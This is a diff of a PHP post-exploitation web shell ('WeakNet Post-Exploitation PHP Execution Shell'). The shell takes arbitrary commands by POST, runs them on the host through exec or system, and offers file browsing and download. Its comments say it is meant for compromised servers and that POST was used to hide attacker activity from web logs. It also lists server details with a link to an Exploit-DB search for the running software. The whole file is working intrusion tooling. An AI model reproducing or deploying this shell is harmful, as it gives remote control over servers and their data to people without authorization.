@@ -137,6 +137,8 @@
 </head>
 <body>
 <?php
+	# This handles the incoming command
+	#
 	if (!$_POST['cmd']) { # initial hit to the page
 		$cmd = "(none) Please type a command to execute below";
 		$output = "WeakNet Post-Exploitation PHP Execution Shell is free, redistributable software. It has no warranty for the program, "
@@ -147,6 +149,9 @@
 			." link on the bottom left. Thank you for choosing WeakNet Labs!";
 	}else{
 		$cmd = $_POST['cmd']; # reassign is easier to read
+		$displayCmd = $cmd; # to allow shell redirects in the actual command that is ran
+		# because apparently folks hack themselves with automation tools once they insert this to a compromised server:
+		$displayCmd = preg_replace("/</","&lt;","$cmd"); # remove tag start fopr displaying on page
 		if($_POST['execType'] == "exec"){ 
 			exec("$cmd 2>/dev/stdout",$results); # a command, let's execute it on the host
 		}elseif($_POST['execType'] == "system"){ 
@@ -158,30 +163,41 @@
 		}
 	}
 	echo "<div class=\"titleBar\"><div class=\"title\"><div class=\"titleCenter\"><span style=\"font-size:35px;\">&#128026; WPES</span> Displaying results for command: ".
-		" <span class=\"cmdTitle\">".$cmd."</span></div></div></div>";
+		" <span class=\"cmdTitle\">".$displayCmd."</span></div></div></div>";
 ?>
-<!-- This is where the outpu of the command goes -->
-<div class="output">
+<div class="output"><!-- This is where the output of the command goes -->
 <?php
+	# This parses the commands returned output to the page:
+	#
 	if($_POST['cmd']){ # a command was passed, parse output:
 		foreach(array_slice($results,1,count($results)) as $output) { # let's format the output, in case it contains HTML characters:
 			$raw = implode ('\n',$results); # save the raw form for downloading
-			$exploded = explode(" ", $output);
-			$file = array_pop($exploded);
-			$path = preg_replace("/.*\s([^ ]+)$/","$1","$cmd"); # get full path
-			if(!preg_match("/\/$/","$path")){ # add a fwd slash:
-				$path .= "/";
-			} # now we can style the regular file output:
-			$output = preg_replace("/&/","&amp;",$output); # replace all ampersands
-			$output = preg_replace("/</","&lt;",$output); # replace all less thanh (open HTML tag brackets)
-			$output = preg_replace("/\s/","&nbsp;",$output); # replace all whitespace
-			if(preg_match("/^ls -l\s/","$cmd")){ # is this an ls command?
+			if(preg_match("/^ls\s/","$cmd") || preg_match("/^ls$/","$cmd")){ # is this an ls command? ruled out lsmod, lsusb, etc
+				if(preg_match("/ /","$output")){ # if a space exists
+					$exploded = explode(" ", $output); # break it up to gather the end file name
+					$file = array_pop($exploded);
+					$path = preg_replace("/.*\s([^ ]+)$/","$1","$cmd"); # get full path
+					if(!preg_match("/\/$/","$path")){ # add a fwd slash:
+						$path .= "/";
+					}
+				}else{
+					$file = $output; # file is just one word, e.g. "ls" instead of "ls -l"
+					$path = ""; # nothing
+				}
 				if(!preg_match("/^d/","$output")){
 					echo "<span style=\"color:yellow\" title=\"Click here view file contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','cat');\">&#128049;</span>&nbsp;".$output."<br />";
 				}else{
 	    				echo "<span style=\"color:#00ce05\" title=\"Click here to view directory contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','ls');\">&#128269;</span>&nbsp;".$output."<br />";
 				}
 			}else{
+				# I could probably use something like <pre> tags here, but I'd rather do it this way just in case:
+				$output = preg_replace("/&/","&amp;",$output); # replace all ampersands, do this first so I can add them back for other chars
+				$output = preg_replace("/</","&lt;",$output); # replace all less thanh (open HTML tag brackets)
+				$output = preg_replace("/>/","&gt;",$output); # replace all greater than (close HTML tag brackets)
+				$output = preg_replace("/%/","&#37;",$output); # replace all percent (hex ascii chars)
+				$output = preg_replace("/\?/","&#63;",$output); # replace all question marks (open PHP tag brackets)
+				$output = preg_replace("/\\$/","&#36;",$output); # replace all question marks (open PHP tag brackets)
+				$output = preg_replace("/\s/","&nbsp;",$output); # replace all whitespace, for rendering
 	    			echo $output."<br />";
 			}
 		}
@@ -192,11 +208,14 @@
 <script>
 	// this is seemingly randomly placement, but I am using PHP to write the file contents that I need to retrieve first
 	function saveFile(){
-		window.open('data:text/plain;charset=utf-8,' + escape('<?php $contents = preg_replace("/(\(|\)|\$|')/","$1",$raw); echo $contents; ?>'));
+		window.open('data:text/plain;charset=utf-8,' + 
+			escape('<?php $contents = preg_replace("/(\(|\)|\$|')/","$1",$raw); echo $contents; ?>'));
 	}
 </script>
 <!-- Download the file -->
 <?php
+	# This script generates the text file from the content of the file in RAM (Does not re-run the command on the server)
+	#
 	if($_POST['downloadFile']){ # pass download, by clicking on the download button
 		if($_POST['downloadFile'] == 1){ # 0 for non download 1 for download
 			$abspath = $path . $file; # 	create an absolute path to the file
@@ -228,7 +247,7 @@
 	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
 		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
 		<input type="hidden" value="<?php if($_POST['execType'] != ""){echo $_POST['execType'];}else{echo "exec";} ?>" name="execType" id="execType"/>
-		<button type="button" onClick="saveFile();">Download File</button>
+		<button type="button" onClick="saveFile();">&#x1F4E5; Download File</button>
 	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
 <!-- The band name on the bottom left -->
 <div class="branding">
@@ -238,18 +257,18 @@
 <div class="serverInfo">
 	<table>
 		<tr><strong style="font-size:16px;">&#128225; Remote Server Information &#128225;</strong></tr>
-		<tr><td>IP</td><td><?php echo "<a title=\"Check ARIN database for this IP address information.\" target=\"_blank\" href=\"http://whois.arin.net/rest/nets;q=".$_SERVER['SERVER_ADDR']
+		<tr><td>&#127758;</td><td>IP</td><td><?php echo "<a title=\"Check ARIN database for this IP address information.\" target=\"_blank\" href=\"http://whois.arin.net/rest/nets;q=".$_SERVER['SERVER_ADDR']
 			."?showDetails=true&showARIN=false&showNonArinTopLevelNet=false&ext=netref2\">"
 			.$_SERVER['SERVER_ADDR']."</a>"; ?>
-		</td</tr>
+		</td></tr>
 		<?php # let's create an exploit-db search link
 			$software = preg_replace("/\//","%20",$_SERVER['SERVER_SOFTWARE']); # get rid of fwd slashes
 			$software = preg_replace("/\([^)]+\)/","",$software); # get rid of OS version
 		?>
-		<tr><td>Hostname</td><td><?php echo "<a target=\"blank\" href=\"https://www.google.com/?gws_rd=ssl#q=site:".$_SERVER['SERVER_NAME']."\">".$_SERVER['SERVER_NAME']."</a>"; ?></td</tr>
-		<tr><td>Software</td><td><?php echo "<a target=\"blank\" title=\"Check for exploits for this software using Exploit-DB.\" href=\"https://www.exploit-db.com/search/?action=search&description=".$software."&e_author=\">".$_SERVER['SERVER_SOFTWARE']."</a>"; ?></td</tr>
-		<tr><td>Timestamp</td><td><?php echo $_SERVER['REQUEST_TIME']; ?></td</tr>
-		<tr><td>Admin</td><td><?php echo "<a target=\"_blank\" title=\"Email administrator.\" href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" ?></td</tr>
+		<tr><td>&#x1F3E0;</td><td>Hostname</td><td><?php echo "<a target=\"blank\" href=\"https://www.google.com/?gws_rd=ssl#q=site:".$_SERVER['SERVER_NAME']."\">".$_SERVER['SERVER_NAME']."</a>"; ?></td</tr>
+		<tr><td>&#x1F4BD;</td><td>Software</td><td><?php echo "<a target=\"blank\" title=\"Check for exploits for this software using Exploit-DB.\" href=\"https://www.exploit-db.com/search/?action=search&description=".$software."&e_author=\">".$_SERVER['SERVER_SOFTWARE']."</a>"; ?></td</tr>
+		<tr><td>&#x1F550;</td><td>Timestamp</td><td><?php echo $_SERVER['REQUEST_TIME']; ?></td</tr>
+		<tr><td>&#128231;</td><td>Admin</td><td><?php echo "<a target=\"_blank\" title=\"Email administrator.\" href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" ?></td</tr>
 	</table>
 </div>
 </body>
